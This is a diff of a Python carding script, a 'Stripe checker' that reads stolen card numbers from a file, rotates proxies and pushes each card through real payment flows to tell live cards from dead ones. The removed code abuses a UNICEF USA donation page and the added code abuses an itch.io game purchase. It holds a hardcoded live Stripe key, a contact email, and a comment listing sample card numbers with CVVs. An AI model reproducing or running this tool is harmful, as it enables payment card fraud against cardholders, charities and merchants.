@@ -1,268 +1,172 @@
-#-*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
 from bs4 import BeautifulSoup
 from itertools import cycle
 import requests
 import json
-import os
+import threading
+import colorama
+
+
+
+colorama.init(autoreset=True)
+reset = '\033[0m'
+fg = [
+    '\033[1;91m',  # RED
+    '\033[1;92m',  # GREEN
+    '\033[1;93m',  # YELLOW
+    '\033[1;94m',  # BLUE
+    '\033[1;95m',  # MAGENTA
+    '\033[1;96m',  # CYAN
+    '\033[1;97m',  # WHITE
+]
+
+'''  ┌───────[ 4447962400608711|06|2021|272 ]──(52)
+     └────────── DEAD >>> Reason: Your card's security code is incorrect.
+┌───────[ 4447962400608109|06|2021|517 ]──(55)
+└────────── DEAD >>> Reason: Your card's security code is incorrect.
+
+┌───────[ 4447962400604579|06|2021|063 ]──(101)
+└────────── DEAD >>> Reason: Your card's security code is incorrect.
+     '''
 
 
 class StripeChecker():
 
     def __init__(self):
-        self.checker_name = "Stripe Checker"
-        self.first_link = "https://donate.unicefusa.org/page/contribute/help-save-childrens-lives-29161"
-        self.second_link = "https://donate.unicefusa.org/page/cde/Api/Validate/v1/"
-        self.third_link = "https://api.stripe.com/v1/tokens"
-        self.fourth_link = "https://platform.qd.bsd.net/api/charge"
-        self.banner = """
-\t------------========== STRIPE CHECKER ==========------------
-\t                 -= Develop by Codekiller =-
-\t                 [DONT LEECH, SAYANG 150 MO]
-\t------------====================================------------
-        """
-        print(self.banner)
-        self.stripe()
+        self.main_domain = "https://puppetcombo.itch.io/nun-massacre"
+        self.purchase = "https://puppetcombo.itch.io/nun-massacre/purchase"
+        self.stripe_tokens = "https://api.stripe.com/v1/tokens"
 
+        print("\n\n  {}   =[ {}ASIANPRO CHECKER {}]=      ".format(fg[0], fg[1], fg[0]))
+        print("      {}  ={}Created by ~AsianPro~ {}=            ".format(fg[0], fg[1], fg[0]))
+        print("  {}--------------------------------------\n".format(fg[0]))
+        self.check()
 
-    def stripe(self):
+    def check(self):
         proxy_lists = []
-        print()
-        firstname = str(input("--=[ Enter First Name : "))
-        lastname  = str(input("--=[ Enter First Name : "))
-        Street    = str(input("--=[ Enter Street     : "))
-        City      = str(input("--=[ Enter City       : "))
-        State     = str(input("--=[ Enter Region     : "))
-        ZipCode   = str(input("--=[ Enter ZipCode    : "))
-        Phone     = str(input("--=[ Enter Phone #    : "))
-        Email     = str(input("--=[ Enter Email      : "))
+        cc_list = open('cc.txt', 'r').read()
+        cc_list = cc_list.split('\n')
+        credit_entry = 0
+        # threads = []
 
-        creds = f"""
- .--Summarize of Credentials:
- |-  FirstName    |    {firstname}
- |-  LastName     |    {lastname}       
- |-  Street       |    {Street}
- |-  City         |    {City}
- |-  ZipCode      |    {ZipCode}
- |-  Phone        |    {Phone}
- |-  Email        |    {Email}
-   [NOTE: PAG MAY NAKALIMUTAN KA LAGYAN OR NAGKAMALI RESTART MO YUNG PROGRAM YAWA]
-"""
-        print(creds)
-        input("[PRESS ENTER TO CONTINUE]")
-        print("[*] Checking Proxies.txt")
-        
-        if os.path.exists('proxies.txt'):
-            print("[+] Proxies: ✓")
-        else:
-            print("[!] Proxies: NOT FOUND")
-            exit(1)
-        
-        print('[*] Checking cc.txt')
-
-        if os.path.exists('cc.txt'):
-            print("[+] CreditCards: ✓")
-        else:
-            print("[!] CreditCards: NOT FOUND")
-            exit(1)
-
-        print("[+] Checking Start!")
-        print("=" * (os.get_terminal_size()[0] - 1))
-        print()
         with open('proxies.txt', 'r') as proxy_list:
             proxy = proxy_list.read()
             proxy = proxy.split('\n')
             for x in proxy:
+                proxy_lists.append(x)
 
-                try:
-                    url, port, user, password = x.split(':')
-                    proxy_lists.append('http://' + user + ':' + password + '@' + url + ':' + port)
-                except ValueError:
-                    pass
+        proxy_pool = cycle(proxy_lists)
+        Username = str("Asians Pro")
+        zipcode = str(input(fg[2] + '[*]' + reset + "ZipCode: "))
+        proxyused = str("n")
+        isproxyused = False
 
-            proxy_pool = cycle(proxy_lists)
+        if proxyused.lower() == "y":
+            isAuth = str(input(fg[5] + "[?]" + reset + " Proxy is Authenticated?[y/n] "))
+        else:
+            isAuth = 'n'
 
-        cc_list = open('cc.txt', 'r').read()
-        cc_list = cc_list.split('\n')
-        ccentry = 0
+        auth = False
 
-        for credit_card in cc_list:
-            ccentry += 1
-            proxy_to_use = next(proxy_pool)
-            ccnum, ccmonth, ccyear, cccvv = credit_card.split('|')
-            cctype = ("visa" if ccnum[0] == "4" else 'mc')
+        if isAuth.lower() == "y":
+            auth = True
+            username = str(input(fg[2] + '[*]' + reset + ' Username: '))
+            password = str(input(fg[2] + '[*]' + reset + ' Password: '))
+        else:
+            username = ""
+            password = ""
 
-            cursess = requests.Session()
-            ip_address = cursess.get("https://www.my-ip.io/api", proxies={'https': proxy_to_use}).text
-            keys = BeautifulSoup(cursess.get(self.first_link, proxies={'https': proxy_to_use}).text, 'html.parser')
-            stripe_pkey = keys.find('script', {'id': 'uqd-config'})['data-stripe_pkey']
-            data_uqd_pkey = keys.find('script', {'id': 'uqd-config'})['data-uqd_pkey']
-
-
-            first_data = {
-                "currency":"USD",
-                "slug":"help-save-childrens-lives-29161",
-                "submission_key":'EJrwPaArggSDSuhnnfUD2Lcop8L3sBqC',
-                "http_referer":"",
-                "http_host":'donate.unicefusa.org',
-                "ip_addr":ip_address,
-                "request_uri":'/page/contribute/help-save-childrens-lives-29161',
-                "event_attendee_id":'',
-                "outreach_page_id":'',
-                "stg_signup_id":'',
-                "mailing_link_id":'',
-                "mailing_recipient_id":'',
-                "match_campaign_id":'',
-                "match_is_pledge":'',
-                "pledge_is_convert":'',
-                "contributor_key":'',
-                "guid":'',
-                "quick_donate_populated":'0',
-                "device_fingerprint":'0',
-                "intl_currency_symbol":"USD",
-                "default_country":"US",
-                "cc_number_ack":"",
-                "initialms":"",
-                "mailcode":"",
-                "k-ris-sid":"okMsWY12twnAuAm7uxwl37IPoFQWImzk",
-                "k-ris-mid":"170850",
-                "kount_chapter_id":"1",
-                "kount_contribution_page_id":"137",
-                "kount_gateway_id":"2",
-                "page_title":"Help Save Children's Lives",
-                "organization_name": "",
-                "client_slug":"usflive",
-                "chapter_id":"1",
-                "amount":"other",
-                "amount_other":"5",
-                "country":"PH",
-                "firstname":firstname,
-                "lastname":lastname,
-                "addr1":Street,
-                "addr2":"",
-                "city":City,
-                "state_cd":State,
-                "zip":ZipCode,
-                "email":Email,
-                "phone":Phone,
-                "cc_type_cd":cctype,
-                "cc_number":ccnum,
-                "cc_expir_month":ccmonth,
-                "cc_expir_year":ccyear,
-                "bestcontacttime":"",
-                "ignore_list":[],
-                "success":"true",
-            }
-
-            first_data_response = json.loads(cursess.post(self.second_link, data=first_data, proxies={"https": proxy_to_use}).text)
-            invoice_data = first_data_response['reporting_data']['invoice_id']
-
-
-            second_data = {
-                "time_on_page":"177540",
-                "pasted_fields":"number",
-                "guid":"8fc7ebf9-51ff-41d9-b716-2149335744c5",
-                "muid":"8d0aace5-d53a-4dc6-8a5b-7bbb4f5e19d9",
-                "sid":"dbcbfde4-0447-4aea-bb29-157a0c42d5ca",
-                "key":stripe_pkey,
-                "payment_user_agent":"stripe.js/303cf2d",
-                "card[number]":ccnum,
-                "card[cvc]":cccvv,
-                "card[exp_month]":ccmonth,
-                "card[exp_year]":ccyear,
-                "card[name]":firstname + ' ' + lastname,
-                "card[address_zip]": ZipCode,
-            }
-            
-            second_data_response = json.loads(cursess.post(self.third_link, data=second_data, proxies={"https": proxy_to_use}).text)
-            stripe_token_id = second_data_response['id']
-            cc_last_four = second_data_response['card']['last4']
-
-
-            last_data = {
-                "source_id":'InObrkCq1rQ7Hemm6GYEebGLmiGU9VFK',
-                "amount":"529",
-                "is_recurring":'0',
-                "kount[gateway_id]":'2',
-                "kount[contribution_page_id]":'137',
-                "kount[chapter_id]":'1',
-                "description":'Help Save Children’s L',
-                "metadata[currency]":'USD',
-                "metadata[slug]":'help-save-childrens-lives-29161',
-                "metadata[submission_key]":'InObrkCq1rQ7Hemm6GYEebGLmiGU9VFK',
-                "metadata[http_referer]":"",
-                "metadata[http_host]":"donate.unicefusa.org",
-                "metadata[ip_addr]":ip_address,
-                "metadata[request_uri]":"/page/contribute/help-save-childrens-lives-29161",
-                "metadata[event_attendee_id]":"",
-                "metadata[outreach_page_id]":"",
-                "metadata[stg_signup_id]":"",
-                "metadata[mailing_link_id]":"",
-                "metadata[mailing_recipient_id]":"",
-                "metadata[match_campaign_id]":"",
-                "metadata[match_is_pledge]":"",
-                "metadata[pledge_is_convert]":"",
-                "metadata[contributor_key]":"",
-                "metadata[guid]":"",
-                "metadata[quick_donate_populated]":"0",
-                "metadata[device_fingerprint]":"0",
-                "metadata[intl_currency_symbol]":"USD",
-                "metadata[default_country]":"US",
-                "metadata[cc_number_ack]":"",
-                "metadata[initialms]":"",
-                "metadata[mailcode]":"",
-                "metadata[k-ris-sid]":"InObrkCq1rQ7Hemm6GYEebGLmiGU9VFK",
-                "metadata[k-ris-mid]":"170850",
-                "metadata[kount_chapter_id]":"1",
-                "metadata[kount_contribution_page_id]":"137",
-                "metadata[kount_gateway_id]":"2",
-                "metadata[page_title]":"Help Save Children's Lives",
-                "metadata[organization_name]":"",
-                "metadata[client_slug]":"usflive",
-                "metadata[chapter_id]":'1',
-                "metadata[bestcontacttime]":"",
-                "metadata[invoice_id]":invoice_data,
-                "metadata[url_amt]":"",
-                "metadata[qd_code]":"",
-                "metadata[form_amts]":"75,100,150,250,500,other-5",
-                "metadata[from_url]":"0",
-                "kount_hash":"VM9ETVYH7MSOGZQE",
-                "email":Email,
-                "phone":Phone,
-                "first_name":firstname,
-                "last_name":lastname,
-                "address1":Street,
-                "address2":"",
-                "city":City,
-                "state":State,
-                "zip":ZipCode,
-                "country":"PH",
-                "cc_expire_year":ccyear,
-                "cc_expire_month":ccmonth,
-                "currency":"PHP",
-                "page_title":"Help Save Children's Lives",
-                "stripe_token":stripe_token_id,
-                "cc_last_four":cc_last_four,
-                "cc_type":('Visa' if cctype == 'visa' else "MasterCard"),
-                "full_gift":"1",
-                "max_contribution":"0",
-                "selected_amount":"500",
-                "api_key":data_uqd_pkey,
-                "referrer":"https://donate.unicefusa.org/",
-            }
-
-            last_data_response = json.loads(cursess.post(self.fourth_link, data=last_data, proxies={"https": proxy_to_use}).text)
-
-            if last_data_response['status'] == 0:
-                print("╭───── " + ccnum + '|' + ccmonth + '|' + ccyear + '|' + cccvv + '─[' + str(ccentry) + ']')
-                print('╰─── DEAD  ==>' + '\tError: ' + last_data_response['message'][:34])
-                print()
-            else:
-                print(last_data_response)
-                print('|-> ' + ccnum + '|' + ccmonth + '|' + ccyear + '|' + cccvv + '\tError: ' + last_data_response['message'])
-            
+        print(fg[3] + "[*]" + reset + " Start Checking of " + str(len(cc_list)) + " Credit Card.")
         print()
-        print("=" * (os.get_terminal_size()[0] - 1))
-        print('[+] CHECKING DONE!')
+        for credit_card in cc_list:
+            session = requests.Session()
+            credit_entry += 1
+            if isproxyused:
+                proxy_to_use = next(proxy_pool)
 
+            session = requests.Session()
+            # session, Username, credit_card, credit_entry,
+            # proxy, username, password, isAuth=False
+
+            try:
+                ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
+            except ValueError:
+                pass
+
+            if isproxyused:
+                if isAuth:
+                    proxy = {'https': "http://" + username + ':' + password + '@' + proxy}
+                else:
+                    proxy = {'https': 'http://' + proxy}
+            else:
+                proxy = {'': ''}
+
+            main_domain_source = BeautifulSoup(session.get(self.main_domain, proxies=proxy).text, 'html.parser')
+            csrf = main_domain_source.find('meta', {'name': 'csrf_token'})['value']
+
+            purchase_data = {
+                "csrf_token": csrf,
+                "source": "stripe",
+                "medium": "default",
+                "initiator": "game",
+                "bp": "1352c97c578a5257f528baee67eecf68",
+                "price": "$4.95",
+                "email": "asianpro597@gmail.com",
+                "json": "true"
+            }
+            purchase_response = json.loads(session.post(self.purchase, data=purchase_data, proxies=proxy).text)
+            try:
+                checkout_url = purchase_response['url']
+            except KeyError:
+                print(fg[0] + "[x]" + reset + " Connection Error.")
+                return
+
+            checkout_data = {
+                'card[name]': Username,
+                'card[number]': ccNum,
+                'card[cvc]': ccCode,
+                'card[exp_month]': ccMonth,
+                'card[exp_year]': ccYear,
+                'card[address_zip]': zipcode,
+                'guid': '7745e9e2-dd6a-4714-8611-2b58a9058a31',
+                'muid': 'ceacade8-663f-48b9-a305-f6b0be7fac82',
+                'sid': 'c6b55fc7-daaf-4219-888b-0af38a4d3f6b',
+                'payment_user_agent': 'stripe.js/e7e4d3cf; stripe-js-v3/e7e4d3cf',
+                'referrer': checkout_url,
+                'key': 'pk_live_YpSNu1qXLz2bvSUqP7TK7P9U',
+                'pasted_fields': 'number'
+            }
+
+            checkout_response = json.loads(session.post(self.stripe_tokens, proxies=proxy, data=checkout_data).text)
+            tok_id = checkout_response['id']
+
+            result_data = {
+                "csrf_token": csrf,
+                "card_token": tok_id,
+                "bp": "1352c97c578a5257f528baee67eecf68",
+                "email": "asianpro597@gmail.com",
+                "name": Username
+            }
+            result_response = session.post(checkout_url, proxies=proxy, data=result_data).text
+            print()
+            try:
+                error = BeautifulSoup(result_response, 'html.parser')
+                error_msg = error.find('div', {'class': 'form_errors'}).get_text()
+
+                if error_msg == "Your card's security code is incorrect.":
+                    print(fg[1] + "AsianPro[ " + credit_card + " ]---(" + str(credit_entry) + ")")
+                    print(fg[1] + "|----------- LIVE! ~> But Incorrect CVV (Good on Amazon)")
+
+                else:
+                    print(fg[0] + "AsianPro[ " + credit_card + " ]---(" + str(credit_entry) + ")")
+                    print(fg[0] + "|----------- " + reset + "DEAD >>> Reason: " + str(error_msg))
+
+            except Exception as e:
+                print(e)
+                print(fg[1] + "AsianPro[ " + credit_card + " ]---(" + str(credit_entry) + ")")
+                print(fg[1] + "|----------- LIVE!")
+        print()
+        print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
+        print()
 
 StripeChecker()
